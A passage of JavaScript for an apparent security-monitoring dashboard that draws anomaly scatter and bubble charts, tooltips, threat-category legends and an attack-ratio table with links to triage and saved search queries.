  const textColor = isLight ? '#1B3561' : '#7CBFF1';
  const gridColor = isLight ? 'rgba(0, 28, 50, 0.08)' : 'rgba(124, 191, 241, 0.12)';

  const maxX = 20; // Velocity (0 to 20 events/min)
  const maxY = 100; // Anomaly Score (0 to 100)

  // Quadrant Highlight: Top Right = High Velocity + High Anomaly (Red Risk Zone)
  const midX = pad.left + (10 / maxX) * chartW;
  const midY = pad.top + chartH - (50 / maxY) * chartH;

  ctx.fillStyle = isLight ? 'rgba(220, 38, 38, 0.06)' : 'rgba(248, 113, 113, 0.08)';
  ctx.fillRect(midX, pad.top, width - pad.right - midX, midY - pad.top);

  ctx.fillStyle = isLight ? 'rgba(5, 150, 105, 0.06)' : 'rgba(39, 211, 140, 0.05)';
  ctx.fillRect(pad.left, midY, midX - pad.left, pad.top + chartH - midY);

  // Quadrant Labels
  ctx.font = 'bold 10px Inter, sans-serif';
  ctx.fillStyle = isLight ? 'rgba(220, 38, 38, 0.7)' : 'rgba(248, 113, 113, 0.6)';
  ctx.textAlign = 'right';
  ctx.fillText('🚨 HIGH-RISK OUTLIER ZONE', width - pad.right - 12, pad.top + 20);

  ctx.fillStyle = isLight ? 'rgba(5, 150, 105, 0.7)' : 'rgba(39, 211, 140, 0.6)';
  ctx.textAlign = 'left';
  ctx.fillText('🛡️ BENIGN BASELINE ZONE', pad.left + 12, pad.top + chartH - 12);

  // Draw Gridlines & Axes
  ctx.strokeStyle = gridColor;
  ctx.lineWidth = 1;
  ctx.fillStyle = textColor;
  ctx.font = '10px JetBrains Mono, monospace';

  // Y-Axis Ticks (Anomaly Score 0 to 100)
  ctx.textAlign = 'right';
  [0, 25, 50, 75, 100].forEach(val => {
    const y = pad.top + chartH - (val / maxY) * chartH;
    ctx.beginPath();
    ctx.moveTo(pad.left, y);
    ctx.lineTo(width - pad.right, y);
    ctx.stroke();
    ctx.fillText(`${val}`, pad.left - 10, y + 4);
  });

  // X-Axis Ticks (Velocity 0 to 20)
  ctx.textAlign = 'center';
  [0, 5, 10, 15, 20].forEach(val => {
    const x = pad.left + (val / maxX) * chartW;
    ctx.beginPath();
    ctx.moveTo(x, pad.top);
    ctx.lineTo(x, pad.top + chartH);
    ctx.stroke();
    ctx.fillText(`${val} ev/m`, x, height - pad.bottom + 18);
  });

  // Axis Titles
  ctx.font = 'bold 10px Inter, sans-serif';
  ctx.fillStyle = textColor;
  ctx.textAlign = 'center';
  ctx.fillText('Request Velocity (Events / Min) &rarr;', pad.left + chartW / 2, height - 10);

  // Plot Scatter Points
  const scatterPoints = entities.map((pt, i) => {
    const cx = pad.left + (Math.min(pt.x, maxX) / maxX) * chartW;
    const cy = pad.top + chartH - (pt.y / maxY) * chartH;
    return { ...pt, cx, cy, x: cx, y: cy, index: i };
  });

  scatterPoints.forEach(p => {
    // Halo ring for high anomalies
    if (p.y >= 75) {
      const halo = document.createElementNS('http://www.w3.org/2000/svg', 'circle');
      halo.setAttribute('cx', p.cx);
      halo.setAttribute('cy', p.cy);
      halo.setAttribute('r', '14');
      halo.setAttribute('fill', 'none');
      halo.setAttribute('stroke', p.color);
      halo.setAttribute('stroke-width', '1.5');
      halo.setAttribute('opacity', '0.4');
      svg.appendChild(halo);
    }

    const circle = document.createElementNS('http://www.w3.org/2000/svg', 'circle');
    circle.setAttribute('cx', p.cx);
    circle.setAttribute('cy', p.cy);
    circle.setAttribute('r', '7');
    circle.setAttribute('fill', p.color);
    circle.setAttribute('stroke', isLight ? '#FFFFFF' : '#001C32');
    circle.setAttribute('stroke-width', '2');
    circle.setAttribute('style', 'cursor: pointer;');
    circle.setAttribute('data-point-type', 'entity');
    circle.setAttribute('data-index', p.index);
    svg.appendChild(circle);
  });

  GRAPH_STATE.activePoints = scatterPoints;
}

// 6. Bubble Chart Renderer (3-Variable Threat Matrix: Velocity vs Risk vs Blast Radius)
function renderBubbleChart(ctx, svg, width, height, pad, data) {
  const entities = data.entities;
  const chartW = width - pad.left - pad.right;
  const chartH = height - pad.top - pad.bottom;
  const isLight = document.body.classList.contains('theme-clean-light');

  const textColor = isLight ? '#1B3561' : '#7CBFF1';
  const gridColor = isLight ? 'rgba(0, 28, 50, 0.08)' : 'rgba(124, 191, 241, 0.12)';

  const maxX = 20;
  const maxY = 100;

  // Gridlines
  ctx.strokeStyle = gridColor;
  ctx.lineWidth = 1;
  ctx.fillStyle = textColor;
  ctx.font = '10px JetBrains Mono, monospace';

  // Y-Axis Ticks
  ctx.textAlign = 'right';
  [0, 25, 50, 75, 100].forEach(val => {
    const y = pad.top + chartH - (val / maxY) * chartH;
    ctx.beginPath();
    ctx.moveTo(pad.left, y);
    ctx.lineTo(width - pad.right, y);
    ctx.stroke();
    ctx.fillText(`${val} Score`, pad.left - 10, y + 4);
  });

  // X-Axis Ticks
  ctx.textAlign = 'center';
  [0, 5, 10, 15, 20].forEach(val => {
    const x = pad.left + (val / maxX) * chartW;
    ctx.beginPath();
    ctx.moveTo(x, pad.top);
    ctx.lineTo(x, pad.top + chartH);
    ctx.stroke();
    ctx.fillText(`${val} EPS`, x, height - pad.bottom + 18);
  });

  // Plot 3D Bubble Circles
  const bubblePoints = entities.map((pt, i) => {
    const cx = pad.left + (Math.min(pt.x, maxX) / maxX) * chartW;
    const cy = pad.top + chartH - (pt.y / maxY) * chartH;
    const radius = pt.r || 14;
    return { ...pt, cx, cy, x: cx, y: cy, radius, index: i };
  });

  // Sort so larger bubbles draw beneath smaller ones
  bubblePoints.sort((a, b) => b.radius - a.radius);

  bubblePoints.forEach(p => {
    const bubble = document.createElementNS('http://www.w3.org/2000/svg', 'circle');
    bubble.setAttribute('cx', p.cx);
    bubble.setAttribute('cy', p.cy);
    bubble.setAttribute('r', p.radius);
    bubble.setAttribute('fill', p.color);
    bubble.setAttribute('fill-opacity', '0.45');
    bubble.setAttribute('stroke', p.color);
    bubble.setAttribute('stroke-width', '2');
    bubble.setAttribute('style', 'cursor: pointer; transition: fill-opacity 0.2s ease;');
    bubble.setAttribute('data-point-type', 'entity');
    bubble.setAttribute('data-index', p.index);
    svg.appendChild(bubble);

    // Inner specular ring for glossy 3D feel
    const innerDot = document.createElementNS('http://www.w3.org/2000/svg', 'circle');
    innerDot.setAttribute('cx', p.cx - p.radius * 0.25);
    innerDot.setAttribute('cy', p.cy - p.radius * 0.25);
    innerDot.setAttribute('r', Math.max(p.radius * 0.2, 2));
    innerDot.setAttribute('fill', '#FFFFFF');
    innerDot.setAttribute('opacity', '0.6');
    innerDot.setAttribute('style', 'pointer-events: none;');
    svg.appendChild(innerDot);

    // Small Text Label on Large Bubbles
    if (p.radius >= 20) {
      const text = document.createElementNS('http://www.w3.org/2000/svg', 'text');
      text.setAttribute('x', p.cx);
      text.setAttribute('y', p.cy + 3);
      text.setAttribute('text-anchor', 'middle');
      text.setAttribute('fill', isLight ? '#001C32' : '#FFFFFF');
      text.setAttribute('font-size', '9px');
      text.setAttribute('font-family', 'JetBrains Mono, monospace');
      text.setAttribute('font-weight', 'bold');
      text.setAttribute('style', 'pointer-events: none;');
      text.textContent = `${p.attackRatio}%`;
      svg.appendChild(text);
    }
  });

  GRAPH_STATE.activePoints = bubblePoints;
}

// Tooltip & Crosshair Interactive Tracking
function setupGraphInteractionEvents() {
  const container = document.getElementById('graph-canvas-container');
  const tooltip = document.getElementById('graph-floating-tooltip');
  const crosshairV = document.getElementById('graph-crosshair-v');
  const crosshairH = document.getElementById('graph-crosshair-h');

  if (!container || !tooltip) return;

  container.addEventListener('mousemove', (e) => {
    const rect = container.getBoundingClientRect();
    const mouseX = e.clientX - rect.left;
    const mouseY = e.clientY - rect.top;

    // Crosshair update
    if (crosshairV && crosshairH) {
      crosshairV.style.display = 'block';
      crosshairV.style.left = `${mouseX}px`;
      crosshairH.style.display = 'block';
      crosshairH.style.top = `${mouseY}px`;
    }

    const points = GRAPH_STATE.activePoints || [];
    let nearest = null;
    let minDistance = 45; // Max snap radius

    points.forEach(p => {
      // If point has bounding box (Column / Bar charts)
      if (p.box) {
        if (mouseX >= p.box.left && mouseX <= p.box.right && mouseY >= p.box.top && mouseY <= p.box.bottom) {
          nearest = p;
          minDistance = 0;
        }
      } else {
        const dist = Math.hypot((p.cx || p.x) - mouseX, (p.cy || p.y) - mouseY);
        if (dist < minDistance) {
          minDistance = dist;
          nearest = p;
        }
      }
    });

    if (nearest) {
      GRAPH_STATE.hoveredItem = nearest;
      showGraphTooltip(tooltip, nearest, mouseX, mouseY, rect.width);
    } else {
      GRAPH_STATE.hoveredItem = null;
      tooltip.style.display = 'none';
    }
  });

  container.addEventListener('mouseleave', () => {
    if (tooltip) tooltip.style.display = 'none';
    if (crosshairV) crosshairV.style.display = 'none';
    if (crosshairH) crosshairH.style.display = 'none';
  });
}

function showGraphTooltip(tooltip, item, mouseX, mouseY, containerW) {
  tooltip.style.display = 'block';

  // Prevent overflow off canvas boundaries
  const clampX = Math.max(Math.min(mouseX, containerW - 140), 140);
  tooltip.style.left = `${clampX}px`;
  tooltip.style.top = `${mouseY}px`;

  const isTimeline = item.phase !== undefined;
  const isCategory = item.category !== undefined && item.code !== undefined;
  const isEntity = item.type !== undefined;

  let ratio = item.ratio !== undefined ? item.ratio : item.attackRatio || 0;
  let ratioClass = ratio > 80 ? 'fill-ratio-critical' : ratio > 0 ? 'fill-ratio-high' : 'fill-ratio-clean';
  let badgeColor = ratio > 80 ? 'badge-critical' : ratio > 0 ? 'badge-high' : 'badge-threat-clean';

  let headerTitle = item.phase || item.category || item.name || 'Telemetry Bucket';
  let badgeText = `${ratio}% Attack Ratio`;

  let detailsHtml = '';

  if (isTimeline) {
    detailsHtml = `
      <div class="tooltip-row">
        <span class="tooltip-label">Timestamp Window:</span>
        <span class="tooltip-val">${item.label} UTC</span>
      </div>
      <div class="tooltip-row">
        <span class="tooltip-label">Malicious Threats:</span>
        <span class="tooltip-val text-red font-bold">${item.malicious} events</span>
      </div>
      <div class="tooltip-row">
        <span class="tooltip-label">Normal Baselines:</span>
        <span class="tooltip-val text-green">${item.benign} events</span>
      </div>
      <div class="tooltip-row">
        <span class="tooltip-label">Attack Context:</span>
        <span class="tooltip-val text-dim" style="font-size: 0.68rem;">${item.desc || '-'}</span>
      </div>
    `;
  } else if (isCategory) {
    detailsHtml = `
      <div class="tooltip-row">
        <span class="tooltip-label">Event Protocol:</span>
        <span class="tooltip-val text-cyan">${item.code}</span>
      </div>
      <div class="tooltip-row">
        <span class="tooltip-label">Target Asset:</span>
        <span class="tooltip-val text-muted">${item.target}</span>
      </div>
      <div class="tooltip-row">
        <span class="tooltip-label">Threat Velocity:</span>
        <span class="tooltip-val text-red font-bold">${item.malicious} of ${item.total} Events</span>
      </div>
    `;
  } else if (isEntity) {
    detailsHtml = `
      <div class="tooltip-row">
        <span class="tooltip-label">Entity Classification:</span>
        <span class="tooltip-val text-cyan">${item.type}</span>
      </div>
      <div class="tooltip-row">
        <span class="tooltip-label">Event Velocity:</span>
        <span class="tooltip-val">${item.x} events/min</span>
      </div>
      <div class="tooltip-row">
        <span class="tooltip-label">Anomaly / Risk Score:</span>
        <span class="tooltip-val font-bold ${item.y >= 75 ? 'text-red' : 'text-green'}">${item.y} / 100</span>
      </div>
      <div class="tooltip-row">
        <span class="tooltip-label">Forensic Context:</span>
        <span class="tooltip-val text-dim" style="font-size: 0.68rem;">${item.details}</span>
      </div>
    `;
  }

  tooltip.innerHTML = `
    <div class="tooltip-header">
      <span class="tooltip-title">${escapeHtml(headerTitle)}</span>
      <span class="badge-severity ${badgeColor}">${escapeHtml(badgeText)}</span>
    </div>
    ${detailsHtml}
    <div class="tooltip-ratio-bar-wrap">
      <div class="tooltip-ratio-label">
        <span class="text-dim">Attack Concentration:</span>
        <span class="font-mono font-bold">${ratio}%</span>
      </div>
      <div class="ratio-meter-bg">
        <div class="ratio-meter-fill ${ratioClass}" style="width: ${ratio}%;"></div>
      </div>
    </div>
  `;
}

// Render Graph Legend Footer
function renderGraphLegend(chartType, data) {
  const legendFooter = document.getElementById('graph-legend-footer');
  if (!legendFooter) return;

  let legendHtml = '';

  if (chartType === 'line' || chartType === 'area') {
    legendHtml = `
      <div class="legend-items-list">
        <div class="legend-item">
          <span class="legend-color-dot" style="background: var(--accent-cyan);"></span>
          <span>Attack Ratio % (Spline)</span>
        </div>
        <div class="legend-item">
          <span class="legend-color-dot" style="background: var(--accent-red);"></span>
          <span>Threat Volume (Events)</span>
        </div>
        <div class="legend-item">
          <span class="legend-color-dot" style="background: var(--accent-green);"></span>
          <span>Normal Baseline Traffic</span>
        </div>
      </div>
      <div class="legend-stats-summary">
        <span>Active Ratio: <strong>${data.attackRatio}%</strong> &bull; Total: <strong>${data.totalEvents} events</strong></span>
      </div>
    `;
  } else if (chartType === 'column') {
    legendHtml = `
      <div class="legend-items-list">
        <div class="legend-item">
          <span class="legend-color-box" style="background: var(--accent-red);"></span>
          <span>Malicious Threats (Bar)</span>
        </div>
        <div class="legend-item">
          <span class="legend-color-box" style="background: var(--accent-green);"></span>
          <span>Normal Baselines (Bar)</span>
        </div>
        <div class="legend-item">
          <span class="font-bold text-amber">91.7%</span>
          <span>Ratio Indicator Label</span>
        </div>
      </div>
      <div class="legend-stats-summary">
        <span>Bin Interval: <strong>1-Minute Sliding Windows</strong></span>
      </div>
    `;
  } else if (chartType === 'bar') {
    legendHtml = `
      <div class="legend-items-list">
        <div class="legend-item">
          <span class="legend-color-box" style="background: var(--accent-red);"></span>
          <span>Critical Threat (&gt;80% Ratio)</span>
        </div>
        <div class="legend-item">
          <span class="legend-color-box" style="background: var(--accent-amber);"></span>
          <span>Medium-High Vector (&gt;0% Ratio)</span>
        </div>
        <div class="legend-item">
          <span class="legend-color-box" style="background: var(--accent-green);"></span>
          <span>Benign Audit Baseline (0% Ratio)</span>
        </div>
      </div>
      <div class="legend-stats-summary">
        <span>Alignment: <strong>MITRE ATT&CK Matrix v14</strong></span>
      </div>
    `;
  } else if (chartType === 'scatter' || chartType === 'bubble') {
    legendHtml = `
      <div class="legend-items-list">
        <div class="legend-item">
          <span class="legend-color-dot" style="background: #F87171;"></span>
          <span>Credential Access & Dump</span>
        </div>
        <div class="legend-item">
          <span class="legend-color-dot" style="background: #FBBF24;"></span>
          <span>Execution & Macro LOLBins</span>
        </div>
        <div class="legend-item">
          <span class="legend-color-dot" style="background: #B794F4;"></span>
          <span>C2 Network Beacon</span>
        </div>
        <div class="legend-item">
          <span class="legend-color-dot" style="background: #27D38C;"></span>
          <span>Normal Baseline Cluster</span>
        </div>
      </div>
      <div class="legend-stats-summary">
        <span>Outlier Threshold: <strong>Z-Score &ge; 2.5 (High Velocity + High Anomaly)</strong></span>
      </div>
    `;
  }

  legendFooter.innerHTML = legendHtml;
}

// Render Correlated Breakdown & Outlier Intelligence Table
function renderAttackRatioTable(data) {
  const tbody = document.getElementById('attack-ratio-table-body');
  const countLabel = document.getElementById('graph-table-count');
  if (!tbody) return;

  const categories = data.categories || [];
  if (countLabel) {
    countLabel.textContent = `Showing ${categories.length} correlated threat clusters and anomaly ratios (${data.totalEvents} total events in memory)`;
  }

  tbody.innerHTML = categories.map((cat, idx) => {
    const ratioNum = parseFloat(cat.ratio);
    const ratioFillClass = ratioNum > 80 ? 'fill-ratio-critical' : ratioNum > 0 ? 'fill-ratio-high' : 'fill-ratio-clean';
    const outlierBadgeClass = cat.anomaly === 'Critical' ? 'badge-outlier-high' : cat.anomaly === 'High' ? 'badge-outlier-med' : 'badge-outlier-clean';

    return `
      <tr>
        <td>
          <strong>${escapeHtml(cat.category)}</strong>
          <div class="text-dim font-mono" style="font-size: 0.7rem; margin-top: 0.15rem;">Target: ${escapeHtml(cat.target)}</div>
        </td>
        <td><code class="font-mono text-cyan">${escapeHtml(cat.code)}</code></td>
        <td class="font-mono font-bold">${cat.total}</td>
        <td class="font-mono text-red font-bold">${cat.malicious}</td>
        <td class="font-mono text-green">${cat.benign}</td>
        <td>
          <div class="ratio-cell-container">
            <div class="ratio-meter-bg">
              <div class="ratio-meter-fill ${ratioFillClass}" style="width: ${cat.ratio}%;"></div>
            </div>
            <span class="ratio-percent-label ${ratioNum > 0 ? 'text-red' : 'text-green'}">${cat.ratio}%</span>
          </div>
        </td>
        <td>
          <span class="${outlierBadgeClass}">${escapeHtml(cat.anomaly)}</span>
        </td>
        <td>
          <div style="display: flex; gap: 0.35rem;">
            <button class="btn btn-sm btn-outline-cyan" onclick="pivotGraphToTriage('${escapeHtml(cat.category)}')" title="Investigate in Alert Triage">Triage &rarr;</button>
            <button class="btn btn-sm btn-outline-green" onclick="pivotGraphToSpl('${escapeHtml(cat.code)}')" title="Inspect with live SPL query">SPL</button>
          </div>
        </td>
      </tr>
    `;
  }).join('');
}

// 1-Click Pivot Helpers from Graph Table
window.pivotGraphToTriage = function(categoryName) {
  switchTab('alert-triage-queue');
  if (categoryName.includes('Spray')) selectAlert('ALT-03');
  else if (categoryName.includes('Macro') || categoryName.includes('PowerShell')) selectAlert('ALT-02');
  else if (categoryName.includes('LSASS')) selectAlert('ALT-01');
  else if (categoryName.includes('Beacon') || categoryName.includes('C2')) selectAlert('ALT-04');
  else selectAlert('ALT-01');
  showToast(`Pivoted from Attack Ratio Visualizer to Triage for: ${categoryName}`);
};

window.pivotGraphToSpl = function(eventCode) {
  switchTab('spl-search-engine');
  const queryInput = document.getElementById('spl-query-input');
  if (eventCode.includes('4625') && queryInput) {
    queryInput.value = SPL_PRESETS.bruteforce;
    executeSplQuery(queryInput.value);
  } else if (eventCode.includes('Sysmon 10') && queryInput) {
    queryInput.value = SPL_PRESETS.lsass;
    executeSplQuery(queryInput.value);
  } else if (eventCode.includes('3') && queryInput) {
    queryInput.value = SPL_PRESETS.beacon;
    executeSplQuery(queryInput.value);
  }
  showToast(`Loaded SPL correlation query for ${eventCode}`);
};

// Canvas Helper: Rounded Rectangle
function roundRect(ctx, x, y, width, height, radius) {
  if (width < 2 * radius) radius = width / 2;
  if (height < 2 * radius) radius = height / 2;
  ctx.beginPath();
  ctx.moveTo(x + radius, y);
  ctx.arcTo(x + width, y, x + width, y + height, radius);
  ctx.arcTo(x + width, y + height, x, y + height, radius);
  ctx.arcTo(x, y + height, x, y, radius);
  ctx.arcTo(x, y, x + width, y, radius);
  ctx.closePath();
}

